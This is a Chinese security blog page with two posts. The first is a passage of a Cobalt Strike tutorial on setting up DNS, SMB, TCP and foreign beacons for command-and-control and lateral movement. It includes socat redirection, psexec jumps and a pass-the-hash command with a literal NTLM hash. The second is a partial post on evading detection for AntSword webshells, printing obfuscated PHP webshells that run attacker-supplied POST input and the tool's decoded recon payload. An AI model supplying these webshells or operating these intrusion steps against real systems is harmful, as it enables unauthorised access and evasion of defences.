<p>​        可以看到数据传输加快了，并且我们可以命令也可以正常执行。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904112632294.png" alt="image-20200904112632294"></p>
<p>​        这里对DNS beacon做一个小小的总结，首先，生成的shell注意要生成stagless的shell，否则会迟迟上不了线。还有就是上线后需要去执行checkin和mode dns-txt命令，否则基本也执行不了命令。</p>
<p>​        最后其实关于dns beacon的配置也可以再profile文件中进行配置。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904113553210.png" alt="image-20200904113553210"></p>
<h4 id="DNS-beacon-配合重定向上线"><a href="#DNS-beacon-配合重定向上线" class="headerlink" title="DNS beacon 配合重定向上线"></a>DNS beacon 配合重定向上线</h4><p>​        首先我们还是再DNS上进行一些配置，不过这次配置，解析的地址设置的不是我们的teamserver的地址，而是做重定向的那台主机的ip地址。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904114435877.png" alt="image-20200904114435877"></p>
<p>​        然后我们用nslookup来进行检查，看是否能正常解析到我们的的重定向主机</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904115655015.png" alt="image-20200904115655015"></p>
<p>​        测试正常以后，我们再重定向主机上用socat做一个转发，将来自53的流量转发到我们teamserver的53，这里需要注意的是转发需要设置udp而不是ftp。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat UDP4-LISTEN:53,fork UDP:XXX.XXX.XXX.XXX:53</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904133845024.png" alt="image-20200904133845024"></p>
<p>​        使用cobaltstrike创建一个dns listener,配置和之前一样</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904133934172.png" alt="image-20200904133934172"></p>
<p>​        配置好以后，我们生成一个stageless的shell，执行后即可上线</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904134414570.png" alt="image-20200904134414570"></p>
<h3 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h3><p>​        在内网横向渗透时，经常会遇到内网主机无法和我们搭建在外网的teamserver进行通信，这时，可以使用smb beacon来上线内网的断网主机。</p>
<p>​        首先创建一个smb listener，因为我们在使用smb beacon时实际是使用了命名管道的技术，所以还要去设置管道名，在下方对应的ntsvcs</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904134955291.png" alt="image-20200904134955291"></p>
<p>​        配置好以后，假如我们现在已经知道了某个内网主机的密码,但是这台内网主机无法通外网，就可以借助smb beacon来上线内网主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.73\admin$ &#x2F;user:&quot;dbadmin&quot; &quot;xxxxx&quot;    &#x2F;&#x2F;首先和内网主机建立ipc连接</span><br><span class="line">jump psexec 192.168.3.73 test666  &#x2F;&#x2F;test666为smb listener的名字</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140424681.png" alt="image-20200904140424681"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140435915.png" alt="image-20200904140435915"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140450106.png" alt="image-20200904140450106"></p>
<p>​        我们在上线的断网机上执行命令，抓包可以看到是边界主机和内网断网主机通过ntsvcs这个命令smb命名管道进行通信的。还要说明的是上线的内网主机默认心跳会一直增加，这个不用管，需要使用的时候去执行就行了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140731323.png" alt="image-20200904140731323"></p>
<p>​        同样我们也可以在GUI界面上使用pth来上线断网机，</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904142513359.png" alt="image-20200904142513359"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904142457361.png" alt="image-20200904142457361"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143038298.png" alt="image-20200904143038298"></p>
<p>​        psexec设置的时候，listener设置我们建立的smb beacon的listener。执行结果如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143131436.png" alt="image-20200904143131436"></p>
<p>​         通过上面的执行过程我们可以看到，cobaltstrike首先伪造了令牌，再通过伪造的令牌执行smb beacon。所以上面那个过程我们完全可以通过命令来执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">pth .\administrator ae4c0d5fb959fda8f4cb1d14a8376af4</span><br><span class="line">shell dir \\192.168.3.73\c$</span><br><span class="line">jump psexec 192.168.3.73 test666</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143524423.png" alt="image-20200904143524423"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143530695.png" alt="image-20200904143530695"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143624650.png" alt="image-20200904143624650"></p>
<p>​        smb beacon在运行过程中不是和我们的teamserver服务端直接通信的，而是和它的父beacon进行通信，再把结果显示出来，因此我们不能直接生成stage或者stageless的exe去执行，因为执行后找不到父进程。</p>
<h3 id="TCP-beacon"><a href="#TCP-beacon" class="headerlink" title="TCP beacon"></a>TCP beacon</h3><h4 id="bind-tcp-beacon"><a href="#bind-tcp-beacon" class="headerlink" title="bind tcp beacon"></a>bind tcp beacon</h4><p>​        tcp beacon和smb beacon类似，也是在内网中使用的，原理也是利用了边界主机作一个中转，它会再内网主机上开启4444端口，我们通过这个端口来接收内网机器的流量。先来看看如何使用</p>
<p>​        首先建立一个TCP listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904145041421.png" alt="image-20200904145041421"></p>
<p>​        建立好以后，再和内网主机建立ipc连接，使用jump命令上线内网断网主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 test666  &#x2F;&#x2F;&#x2F;test666为tcp listener的名字</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904145254580.png" alt="image-20200904145254580"></p>
<p>​        上线后我们使用wireshark看一看流量，我们可以看到内网主机是通过开放4444端口，通过边界机的某个端口和内网的主机通过TCP进行通信，最后再由边界机将流量发送给我们的服务端。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152346964.png" alt="image-20200904152346964"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152004125.png" alt="image-20200904152004125"></p>
<p>​        当我们再内网主机上执行命令，可以看到命令是再边界机上和teamserver通信进行传输的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152253205.png" alt="image-20200904152253205"></p>
<p>​        从下面的图也可以看出连接的关系，边界机和teamserver之间是反向连接的，而边界机和内网主机是正向连接的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152525518.png" alt="image-20200904152525518"></p>
<p>​        下面是断开和连接内网主机的命令,注意看这里连接不是使用link，而是使用connect</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink 192.168.3.73</span><br><span class="line">connect 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152724658.png" alt="image-20200904152724658"></p>
<p>​        对于tcp bind beacon这种形式，我们也可以生成一个stageless的exe，在内网主机上执行，需要注意的是执行后不会直接上线，而是在内网主机上开放一个端口，我们在边界机上使用connect命令去连接目标即可。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904153621521.png" alt="image-20200904153621521"></p>
<p>​        listener这里设置我们的tcp listener的名字</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904153637610.png" alt="image-20200904153637610"></p>
<p>​        生成的shell在目标主机执行后，查看端口会开启4444端口的监听</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154100177.png" alt="image-20200904154100177"></p>
<p>​        我们再使用边界机去连接，即可上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154344617.png" alt="image-20200904154344617"></p>
<h4 id="revserse-tcp-beacon"><a href="#revserse-tcp-beacon" class="headerlink" title="revserse tcp beacon"></a>revserse tcp beacon</h4><p>​        上面演示了关于bind tcp beacon的用法，实际上我们使用reverse tcp beacon来上线断网主机。</p>
<p>​        首先再边界机上创建一个reverse  tcp listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154603243.png" alt="image-20200904154603243"></p>
<p>​        设置的时候需要注意host要写边界机对应的内网的网段，我的测试中192.168.3网段使用的仅主机模式，边界机对应的仅主机模式的地址是192.168.3.144</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154713600.png" alt="image-20200904154713600"></p>
<p>​        生成好以后，我们同样先和内网断网机建立ipc连接，建立后使用jump命令来上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 test123123  &#x2F;&#x2F;test123123是刚建立的反向tcp listener的名字</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154910274.png" alt="image-20200904154910274"></p>
<p>​        我们在断网机上看看，使用这种模式会在边界主机开放一个4444端口，断网机和目标的4444端口来进行通信</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904155149201.png" alt="image-20200904155149201"></p>
<p>​        从cobaltstrike上也能看到使用的内网主机反向连接了边界主机</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904155317538.png" alt="image-20200904155317538"></p>
<p>​        当然也可以生成stageless的exe来上线，生成的exe在内网主机执行后会直接上线，不用我们主动去连接它。</p>
<h3 id="foreign-beaon"><a href="#foreign-beaon" class="headerlink" title="foreign beaon"></a>foreign beaon</h3><p>​        有时候我们会有这样的需求，就是将我们获得的beacon派生给其他的服务端做稳控，或者派生给msf，这就需要使用foreign beaon。</p>
<p>​        首先我们在另一个CobaltStrike上开启一个HTTP Listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904163933413.png" alt="image-20200904163933413"></p>
<p>​    再回到派生的那台cobaltstrike，这台cobaltstrike上已经有了一个上线的主机。我们给这个cobaltstrike上创建一个foreign beacon。地址选择我们刚刚创建http listener的那台主机</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164121861.png" alt="image-20200904164121861"></p>
<p>​    创建好以后，在需要派生的beacon上选择Spawn</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164255379.png" alt="image-20200904164255379"></p>
<p>​        在弹出的框中选择我们创建的foreign listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164320540.png" alt="image-20200904164320540"></p>
<p>​        确定后可以看到另一个cobaltstrike上线了，并且可以看到是使用rundll32的方式执行的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904165109471.png" alt="image-20200904165109471"></p>
<p>​        关于派生给msf的方法类似，就不讲了。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        最后我们来总结一下，在cobaltstrike中提供了很多beacon上线的方式，其中http/https/比较适合上线边界主机，当然在网络环境比较差的情况下也可以使用DNS来上线，不过DNS beacon执行命令还可以，但是要上传和下载文件速度会非常慢。在内网横向渗透的时候可以使用SMB beacon和TCP beacon，需要将beacon派生给其他的C2可以使用foreign beaon。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://shimo.im/docs/3RjkWKcQxkrPwxyd/read" target="_blank" rel="noopener">关于合法证书+ps上线手把手示范</a></p>
<p><a href="https://xz.aliyun.com/t/7488" target="_blank" rel="noopener">cobaltstrike dns beacon知多少</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于蚁剑免杀的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-02 19:58:25" itemprop="dateCreated datePublished" datetime="2020-09-02T19:58:25+08:00">2020-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-28 18:38:42" itemprop="dateModified" datetime="2020-07-28T18:38:42+08:00">2020-07-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当我们直接使用蚁剑这种比较出名的shell管理工具，在一些防护比较严的情况下，可能过一会会就被发现甚至关站，因此去除蚁剑的特征或者对shell免杀都是特别重要的，我之前并未接触过这方面的知识，写这篇文章的目的就是记录自己学习的一个过程，所以开始吧。</span><br></pre></td></tr></table></figure>

<p>我认为特征处理有几个部分吧，一个是静态代码特征，比如我们直接使用蚁剑的马，这种马如果我们没有进行过任何处理直接上传就非常有可能在上传的时候被干掉，也就是说如果在上传的时候就被干掉了，或者上传之后被干掉了，问题都出在传的马被杀了。还有一种情况就是我们的马传上去了，而且也能访问到，然后使用蚁剑连接的时候发现连接被阻断同时马被杀了，这个就是流量方面的特征的问题了。</p>
<h3 id="自带shell分析"><a href="#自带shell分析" class="headerlink" title="自带shell分析"></a>自带shell分析</h3><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>这里首先以php为例，因为其语法变化最为灵活，也是相对来说比较容易做处理的，首先我们看下自带的马是什么样子的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">$ant($_POST[&#39;ant&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个代码非常容易理解，就是将assert关键字进行base64编码，但是我使用assert这个shell会有一个问题，就是蚁剑连不上，通过抓包分析， 在蚁剑连接的时候会发送一个数据包。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727103950002.png" alt="image-20200727103950002"></p>
<p>因为发送这个数据后返回为空，所以蚁剑显示连接不上，但是我这里将这串数据改成phpinfo()也是可以正常执行的，也就是说这里并不是因为assert不能正常执行命令的问题。我们将这串代码解码后看看,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line"></span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">    return $out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    $output &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;97a7a&quot;;</span><br><span class="line">    echo @asenc($output);</span><br><span class="line">    echo &quot;777a7fdcd7c&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    $D &#x3D; dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    if ($D &#x3D;&#x3D; &quot;&quot;) $D &#x3D; dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">    $R &#x3D; &quot;&#123;$D&#125;	&quot;;</span><br><span class="line">    if (substr($D, 0, 1) !&#x3D; &quot;&#x2F;&quot;) &#123;</span><br><span class="line">        foreach(range(&quot;C&quot;, &quot;Z&quot;) as $L) if (is_dir(&quot;&#123;$L&#125;:&quot;)) $R. &#x3D; &quot;&#123;$L&#125;:&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $R. &#x3D; &quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $R. &#x3D; &quot;	&quot;;</span><br><span class="line">    $u &#x3D; (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;;</span><br><span class="line">    $s &#x3D; ($u) ? $u[&quot;name&quot;] : @get_current_user();</span><br><span class="line">    $R. &#x3D; php_uname();</span><br><span class="line">    $R. &#x3D; &quot;	&#123;$s&#125;&quot;;</span><br><span class="line">    echo $R;;</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e - &gt; getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>

<p>大致的意思会输出一些内容  随机字符串+环境变量+随机字符串，如果用eval代替assert是完全没问题的，我查了下资料，assert是不能执行多个语句的，eval可以，所以这里使用assert会有返回为空的问题。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114425121.png" alt="image-20200727114425121"></p>
<p>这个问题可以使用base64编码的问题解决，编码后的数据包如下，可以看到ant这个参数传入的是一句话，因此就可以通过assert执行成功。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114808620.png" alt="image-20200727114808620"></p>
<p>这里就是蚁剑使用assert的shell的一个坑，<strong>如果使用assert不要使用默认编码。</strong></p>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>这种方式是通过create_function创建匿名函数来执行命令的，shell的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;create_function(&quot;&quot;, base64_decode(&#39;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#39;));</span><br><span class="line">$ant();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="php-custom-script-for-mysql"><a href="#php-custom-script-for-mysql" class="headerlink" title="php_custom_script_for_mysql"></a>php_custom_script_for_mysql</h4><p>使用这种方式的shell，需要在连接类型上选择custom，否则会连接不上。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727131327779.png" alt="image-20200727131327779"></p>
<p>使用这种模式我们需要上传的代码是比较长的，大概13k左右。好处就是在数据包中没有明显的eval这样命令执行的名字出现，因为作者已经在custom的代码中进行了实现。比如我们要测试连接。我拿create_funcion和custom的数据包进行对比，内容如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132341964.png" alt="image-20200727132341964"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132412642.png" alt="image-20200727132412642"></p>
<p>为什么A就可以返回内容，我们大概分析下代码。</p>
<p>首先获取$pwd也就是我们的密码的参数值，调用EC字符串编解码的函数进行处理</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132702622.png" alt="image-20200727132702622"></p>
<p>根据pwd的值的不同调用不同的函数做对应的操作</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132825291.png" alt="image-20200727132825291"></p>
